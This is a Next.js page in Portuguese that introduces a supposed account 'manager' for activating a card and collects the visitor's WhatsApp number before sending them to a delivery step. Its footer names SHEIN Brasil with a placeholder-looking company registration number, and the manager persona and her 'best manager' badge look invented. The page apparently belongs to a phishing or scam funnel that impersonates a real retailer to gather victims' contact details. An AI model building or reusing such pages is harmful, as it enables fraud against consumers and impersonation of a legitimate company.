"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"

export default function ManagerPage() {
  const [whatsapp, setWhatsapp] = useState("")
  const [isValid, setIsValid] = useState(false)
  const router = useRouter()

  // Format WhatsApp number
  const formatWhatsApp = (value: string) => {
    // Remove all non-digits
    const digits = value.replace(/\D/g, "")

    // Limit to 11 digits (Brazilian format)
    const limited = digits.slice(0, 11)

    // Format as (XX) XXXXX-XXXX
    if (limited.length <= 2) {
      return limited
    } else if (limited.length <= 7) {
      return `(${limited.slice(0, 2)}) ${limited.slice(2)}`
    } else {
      return `(${limited.slice(0, 2)}) ${limited.slice(2, 7)}-${limited.slice(7)}`
    }
  }

  // Validate WhatsApp number (11 digits)
  const validateWhatsApp = (value: string) => {
    const digits = value.replace(/\D/g, "")
    return digits.length === 11
  }

  const handleWhatsAppChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatWhatsApp(e.target.value)
    setWhatsapp(formatted)
    setIsValid(validateWhatsApp(formatted))
  }

  const handleContinue = () => {
    if (isValid) {
      // Save WhatsApp to localStorage
      localStorage.setItem("whatsapp", whatsapp)
      // Redirect to delivery method
      router.push("/delivery-method")
    }
  }

  return (
    <div className="min-h-screen bg-[#f2f2f2] font-sans">
      {/* Main Content */}
      <div className="px-5 py-5 max-w-2xl mx-auto">
        <div className="bg-white rounded-xl shadow-lg p-5">
          {/* Title */}
          <h1 className="text-2xl font-bold text-gray-800 mb-3 text-center mt-0">Ótimo, quase lá!</h1>

          {/* Subtitle */}
          <p className="text-sm text-gray-600 mb-5 text-center leading-relaxed">
            Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!
          </p>

          {/* Manager Card */}
          <div className="bg-[#fff7db] border border-[#ffbf00] rounded-xl p-5 pb-3 mb-5">
            {/* Manager Photo */}
            <div className="flex justify-center mb-3">
              <Image
                src="/gerente-juliana.png"
                alt="Foto da Gerente"
                width={120}
                height={120}
                className="rounded-full object-cover"
                style={{ border: "3px solid #ffbf00" }}
              />
            </div>

            {/* Manager Info */}
            <p className="text-gray-600 text-sm text-center mb-1">Gerente</p>
            <p className="text-[#ffbf00] font-bold text-lg text-center -mt-1 mb-2">Juliana Benedito</p>

            {/* Badge */}
            <div className="flex justify-center mt-0">
              <div className="bg-[#ffbf00] text-white px-3 py-1 rounded-full text-xs font-bold flex items-center">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="w-3 h-3 mr-1"
                >
                  <path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"></path>
                  <path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"></path>
                  <path d="M4 22h16"></path>
                  <path d="M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22"></path>
                  <path d="M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22"></path>
                  <path d="M18 2H6v7a6 6 0 0 0 12 0V2Z"></path>
                </svg>
                Melhor gerente 2021-2024
              </div>
            </div>
          </div>

          {/* WhatsApp Input */}
          <div className="flex items-center justify-center mb-2">
            <Image
              src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"
              alt="WhatsApp"
              width={20}
              height={20}
              className="mr-3"
            />
            <input
              type="tel"
              className="flex h-10 w-full px-3 py-2 border-0 border-b border-gray-300 rounded-none bg-transparent text-base font-sans focus:border-gray-400 focus:ring-0 flex-1 focus:outline-none"
              placeholder="Digite seu WhatsApp aqui"
              maxLength={15}
              value={whatsapp}
              onChange={handleWhatsAppChange}
              style={{
                boxShadow: "none",
                borderTop: "none",
                borderLeft: "none",
                borderRight: "none",
                borderRadius: "0",
              }}
            />
          </div>

          {/* Continue Button */}
          <button
            className={`w-full font-bold py-4 px-6 rounded-lg text-base transition-colors ${
              isValid
                ? "bg-black text-white hover:bg-black/90 cursor-pointer"
                : "bg-gray-300 text-gray-500 cursor-not-allowed"
            }`}
            disabled={!isValid}
            onClick={handleContinue}
          >
            Continuar
          </button>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-[#f9f9f9] border-t border-[#eaeaea] px-4 py-6 text-center mt-12">
        <div className="max-w-2xl mx-auto">
          <p className="text-gray-600 text-xs mb-1 leading-tight">SHEIN Brasil LTDA | CNPJ: 12.345.678/0001-99</p>
          <p className="text-gray-600 text-xs mb-2 leading-tight">
            Av. Paulista, 1000 - Bela Vista, São Paulo - SP, 01310-100
          </p>
          <p className="text-gray-500 text-xs">© 2025 - Todos os direitos reservados</p>
        </div>
      </footer>
    </div>
  )
}
